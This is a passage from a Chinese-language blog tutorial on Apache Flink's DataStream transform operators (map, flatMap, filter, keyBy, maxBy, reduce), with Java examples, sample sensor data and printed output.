class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">7&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_9&#x27;</span>, timestamp=1612091759321, temperature=83.80320976056609&#125;</span></span><br><span class="line"><span class="meta">15&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_10&#x27;</span>, timestamp=1612091759321, temperature=68.77967856820972&#125;</span></span><br><span class="line"><span class="meta">1&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_1&#x27;</span>, timestamp=1612091759321, temperature=45.75304941852771&#125;</span></span><br><span class="line"><span class="meta">6&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_6&#x27;</span>, timestamp=1612091759321, temperature=71.80036477804133&#125;</span></span><br><span class="line"><span class="meta">3&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_7&#x27;</span>, timestamp=1612091759321, temperature=55.262086521569564&#125;</span></span><br><span class="line"><span class="meta">2&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_2&#x27;</span>, timestamp=1612091759321, temperature=64.0969570576537&#125;</span></span><br><span class="line"><span class="meta">5&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_5&#x27;</span>, timestamp=1612091759321, temperature=51.09761352612651&#125;</span></span><br><span class="line"><span class="meta">14&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_3&#x27;</span>, timestamp=1612091759313, temperature=32.49085393551031&#125;</span></span><br><span class="line"><span class="meta">4&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_8&#x27;</span>, timestamp=1612091759321, temperature=64.83732456896752&#125;</span></span><br><span class="line"><span class="meta">16&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_4&#x27;</span>, timestamp=1612091759321, temperature=88.88318538017865&#125;</span></span><br><span class="line"><span class="meta">12&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_2&#x27;</span>, timestamp=1612091761325, temperature=65.21522804626638&#125;</span></span><br><span class="line"><span class="meta">16&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_6&#x27;</span>, timestamp=1612091761325, temperature=70.49210870668041&#125;</span></span><br><span class="line"><span class="meta">15&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_5&#x27;</span>, timestamp=1612091761325, temperature=50.32349231082738&#125;</span></span><br><span class="line">....</span><br></pre></td></tr></table></figure><h4 id="Transform"><a href="#Transform" class="headerlink" title="Transform"></a>Transform</h4><p>map、flatMap、filter通常被统一称为<strong>基本转换算子</strong>（<strong>简单转换算子</strong>）。</p><h5 id="基本转换算子-map-flatMap-filter"><a href="#基本转换算子-map-flatMap-filter" class="headerlink" title="基本转换算子(map/flatMap/filter)"></a>基本转换算子(map/flatMap/filter)</h5><blockquote><p><a href="https://zhuanlan.zhihu.com/p/66196174">到处是map、flatMap，啥意思？</a></p></blockquote><p>java代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.transform;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.FilterFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.FlatMapFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.MapFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/1/31 7:31 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformTest1_Base</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 创建执行环境</span></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使得任务抢占同一个线程</span></span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从文件中获取数据输出</span></span><br><span class="line">        DataStream&lt;String&gt; dataStream = env.readTextFile(<span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. map, String =&gt; 字符串长度INT</span></span><br><span class="line">        DataStream&lt;Integer&gt; mapStream = dataStream.map(<span class="keyword">new</span> MapFunction&lt;String, Integer&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Integer <span class="title">map</span><span class="params">(String value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> value.length();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. flatMap，按逗号分割字符串</span></span><br><span class="line">        DataStream&lt;String&gt; flatMapStream = dataStream.flatMap(<span class="keyword">new</span> FlatMapFunction&lt;String, String&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">flatMap</span><span class="params">(String value, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                String[] fields = value.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">                <span class="keyword">for</span>(String field:fields)&#123;</span><br><span class="line">                    out.collect(field);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. filter,筛选&quot;sensor_1&quot;开头的数据</span></span><br><span class="line">        DataStream&lt;String&gt; filterStream = dataStream.filter(<span class="keyword">new</span> FilterFunction&lt;String&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">filter</span><span class="params">(String value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> value.startsWith(<span class="string">&quot;sensor_1&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 打印输出</span></span><br><span class="line">        mapStream.print(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        flatMapStream.print(<span class="string">&quot;flatMap&quot;</span>);</span><br><span class="line">        filterStream.print(<span class="string">&quot;filter&quot;</span>);</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">map&gt;</span><span class="bash"> 24</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> sensor_1</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> 1547718199</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> 35.8</span></span><br><span class="line"><span class="meta">filter&gt;</span><span class="bash"> sensor_1,1547718199,35.8</span></span><br><span class="line"><span class="meta">map&gt;</span><span class="bash"> 24</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> sensor_6</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> 1547718201</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> 15.4</span></span><br><span class="line"><span class="meta">map&gt;</span><span class="bash"> 23</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> sensor_7</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> 1547718202</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> 6.7</span></span><br><span class="line"><span class="meta">map&gt;</span><span class="bash"> 25</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> sensor_10</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> 1547718205</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> 38.1</span></span><br><span class="line"><span class="meta">filter&gt;</span><span class="bash"> sensor_10,1547718205,38.1</span></span><br><span class="line"><span class="meta">map&gt;</span><span class="bash"> 24</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> sensor_1</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> 1547718207</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> 36.3</span></span><br><span class="line"><span class="meta">filter&gt;</span><span class="bash"> sensor_1,1547718207,36.3</span></span><br><span class="line"><span class="meta">map&gt;</span><span class="bash"> 24</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> sensor_1</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> 1547718209</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> 32.8</span></span><br><span class="line"><span class="meta">filter&gt;</span><span class="bash"> sensor_1,1547718209,32.8</span></span><br><span class="line"><span class="meta">map&gt;</span><span class="bash"> 24</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> sensor_1</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> 1547718212</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> 37.1</span></span><br><span class="line"><span class="meta">filter&gt;</span><span class="bash"> sensor_1,1547718212,37.1</span></span><br></pre></td></tr></table></figure><h5 id="聚合操作算子"><a href="#聚合操作算子" class="headerlink" title="聚合操作算子"></a>聚合操作算子</h5><blockquote><p><a href="https://blog.csdn.net/dongkang123456/article/details/108361376">Flink_Trasform算子</a></p></blockquote><ul><li>DataStream里没有reduce和sum这类聚合操作的方法，因为<strong>Flink设计中，所有数据必须先分组才能做聚合操作</strong>。</li><li><strong>先keyBy得到KeyedStream，然后调用其reduce、sum等聚合操作方法。（先分组后聚合）</strong></li></ul><hr><p>常见的聚合操作算子主要有：</p><ul><li> keyBy </li><li> 滚动聚合算子Rolling Aggregation </li><li> reduce </li></ul><hr><h6 id="keyBy"><a href="#keyBy" class="headerlink" title="keyBy"></a>keyBy</h6><p><img src="https://img-blog.csdnimg.cn/20200902141943335.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RvbmdrYW5nMTIzNDU2,size_16,color_FFFFFF,t_70###pic_center###id=XJhT8&originHeight=208&originWidth=628&originalType=binary&ratio=1&status=done&style=none"></p><p><strong>DataStream -&gt; KeyedStream</strong>：逻辑地将一个流拆分成不相交的分区，每个分区包含具有相同key的元素，在内部以hash的形式实现的。</p><p>1、KeyBy会重新分区；<br>2、不同的key有可能分到一起，因为是通过hash原理实现的；</p><h6 id="Rolling-Aggregation"><a href="#Rolling-Aggregation" class="headerlink" title="Rolling Aggregation"></a>Rolling Aggregation</h6><p>这些算子可以针对KeyedStream的每一个支流做聚合。</p><ul><li>sum()</li><li>min()</li><li>max()</li><li>minBy()</li><li>maxBy()</li></ul><hr><p>测试maxBy的java代码一</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.transform;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.MapFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.KeyedStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/1/31 9:51 PM</span></span><br><span class="line"><span class="comment"> * 滚动聚合，测试</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformTest2_RollingAggregation</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 创建 执行环境</span></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行环境并行度设置1</span></span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        DataStream&lt;String&gt; dataStream = env.readTextFile(<span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        DataStream&lt;SensorReading&gt; sensorStream = dataStream.map(new MapFunction&lt;String, SensorReading&gt;() &#123;</span></span><br><span class="line"><span class="comment">//            @Override</span></span><br><span class="line"><span class="comment">//            public SensorReading map(String value) throws Exception &#123;</span></span><br><span class="line"><span class="comment">//                String[] fields = value.split(&quot;,&quot;);</span></span><br><span class="line"><span class="comment">//                return new SensorReading(fields[0],new Long(fields[1]),new Double(fields[2]));</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125;);</span></span><br><span class="line"></span><br><span class="line">        DataStream&lt;SensorReading&gt; sensorStream = dataStream.map(line -&gt; &#123;</span><br><span class="line">            String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 先分组再聚合</span></span><br><span class="line">        <span class="comment">// 分组</span></span><br><span class="line">        KeyedStream&lt;SensorReading, String&gt; keyedStream = sensorStream.keyBy(SensorReading::getId);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 滚动聚合，max和maxBy区别在于，maxBy除了用于max比较的字段以外，其他字段也会更新成最新的，而max只有比较的字段更新，其他字段不变</span></span><br><span class="line">        DataStream&lt;SensorReading&gt; resultStream = keyedStream.maxBy(<span class="string">&quot;temperature&quot;</span>);</span><br><span class="line"></span><br><span class="line">        resultStream.print(<span class="string">&quot;result&quot;</span>);</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>sensor.txt</code>文件内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sensor_1,1547718199,35.8</span><br><span class="line">sensor_6,1547718201,15.4</span><br><span class="line">sensor_7,1547718202,6.7</span><br><span class="line">sensor_10,1547718205,38.1</span><br><span class="line">sensor_1,1547718207,36.3</span><br><span class="line">sensor_1,1547718209,32.8</span><br><span class="line">sensor_1,1547718212,37.1</span><br></pre></td></tr></table></figure><p>输出如下：</p><p><em>由于是滚动更新，每次输出历史最大值，所以下面36.3才会出现两次</em></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">result&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_1&#x27;</span>, timestamp=1547718199, temperature=35.8&#125;</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_6&#x27;</span>, timestamp=1547718201, temperature=15.4&#125;</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_7&#x27;</span>, timestamp=1547718202, temperature=6.7&#125;</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_10&#x27;</span>, timestamp=1547718205, temperature=38.1&#125;</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_1&#x27;</span>, timestamp=1547718207, temperature=36.3&#125;</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_1&#x27;</span>, timestamp=1547718207, temperature=36.3&#125;</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_1&#x27;</span>, timestamp=1547718212, temperature=37.1&#125;</span></span><br></pre></td></tr></table></figure><h6 id="reduce"><a href="#reduce" class="headerlink" title="reduce"></a>reduce</h6><pre><code>**Reduce适用于更加一般化的聚合操作场景**。java中需要实现`ReduceFunction`函数式接口。</code></pre><hr><pre><code>在前面Rolling Aggregation的前提下，对需求进行修改。获取同组历史温度最高的传感器信息，同时要求实时更新其时间戳信息。</code></pre><p>java代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.transform;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.KeyedStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.kafka.common.metrics.stats.Max;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/1/31 10:14 PM</span></span><br><span class="line"><span class="comment"> * 复杂场景，除了获取最大温度的整个传感器信息以外，还要求时间戳更新成最新的</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformTest3_Reduce</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 创建 执行环境</span></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行环境并行度设置1</span></span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        DataStream&lt;String&gt; dataStream = env.readTextFile(<span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        DataStream&lt;SensorReading&gt; sensorStream = dataStream.map(line -&gt; &#123;</span><br><span class="line">            String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 先分组再聚合</span></span><br><span class="line">        <span class="comment">// 分组</span></span><br><span class="line">        KeyedStream&lt;SensorReading, String&gt; keyedStream = sensorStream.keyBy(SensorReading::getId);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// reduce，自定义规约函数，获取max温度的传感器信息以外，时间戳要求更新成最新的</span></span><br><span class="line">        DataStream&lt;SensorReading&gt; resultStream = keyedStream.reduce(</span><br><span class="line">                (curSensor,newSensor)-&gt;<span class="keyword">new</span> SensorReading(curSensor.getId(),newSensor.getTimestamp(), Math.max(curSensor.getTemperature(), newSensor.getTemperature()))</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        resultStream.print(<span class="string">&quot;result&quot;</span>);</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>sensor.txt</code>文件内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sensor_1,1547718199,35.8</span><br><span class="line">sensor_6,1547718201,15.4</span><br><span class="line">sensor_7,1547718202,6.7</span><br><span class="line">sensor_10,1547718205,38.1</span><br><span class="line">sensor_1,1547718207,36.3</span><br><span class="line">sensor_1,1547718209,32.8</span><br><span class="line">sensor_1,1547718212,37.1</span><br></pre></td></tr></table></figure><p>输出如下：</p><p><em>和前面“Rolling Aggregation”小节不同的是，倒数第二条数据的时间戳用了当前比较时最新的时间戳。</em></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">result&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_1&#x27;</span>, timestamp=1547718199, temperature=35.8&#125;</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_6&#x27;</span>, timestamp=1547718201, temperature=15.4&#125;</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_7&#x27;</span>, timestamp=1547718202, temperature=6.7&#125;</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_10&#x27;</span>, timestamp=1547718205, temperature=38.1&#125;</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_1&#x27;</span>, timestamp=1547718207, temperature=36.3&#125;</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_1&#x27;</span>, timestamp=1547718209, temperature=36.3&#125;</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_1&#x27;</span>, timestamp=1547718212, temperature=37.1&#125;</span></span><br></pre></td></tr></table></figure><h5 id="多流转换算子"><a href="#多流转换算子" class="headerlink" title="多流转换算子"></a>多流转换算子</h5><blockquote><p><a href="https://blog.csdn.net/dongkang123456/article/details/108361376">Flink_Trasform算子</a></p></blockquote><p>多流转换算子一般包括：</p><ul><li> Split和Select （新版已经移除） </li><li> Connect和CoMap </li><li> Union </li></ul><h6 id="Split和Select"><a href="#Split和Select" class="headerlink" title="Split和Select"></a>Split和Select</h6><p><strong>注：新版Flink已经不存在Split和Select这两个API了（至少Flink1.12.1没有！）</strong></p><p>####### Split</p><p><img src="https://img-blog.csdnimg.cn/20200902194203248.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RvbmdrYW5nMTIzNDU2,size_16,color_FFFFFF,t_70###pic_center###id=qz4Cx&originHeight=330&originWidth=664&originalType=binary&ratio=1&status=done&style=none"><br><strong>DataStream -&gt; SplitStream</strong>：根据某些特征把DataStream拆分成SplitStream;</p><p><strong>SplitStream虽然看起来像是两个Stream，但是其实它是一个特殊的Stream</strong>;</p><p>####### Select</p><p><img src="https://img-blog.csdnimg.cn/20200902194442828.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RvbmdrYW5nMTIzNDU2,size_16,color_FFFFFF,t_70###pic_center###id=QFc8X&originHeight=286&originWidth=696&originalType=binary&ratio=1&status=done&style=none"><br><strong>SplitStream -&gt; DataStream</strong>：从一个SplitStream中获取一个或者多个DataStream;</p><p><strong>我们可以结合split&amp;select将一个DataStream拆分成多个DataStream。</strong></p><hr><p>测试场景：根据传感器温度高低，划分成两组，high和low（&gt;30归入high）：</p><p><em>这个我发现在Flink当前时间最新版1.12.1已经不是DataStream的方法了，被去除了</em></p><p>这里直接附上教程代码（Flink1.10.1）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 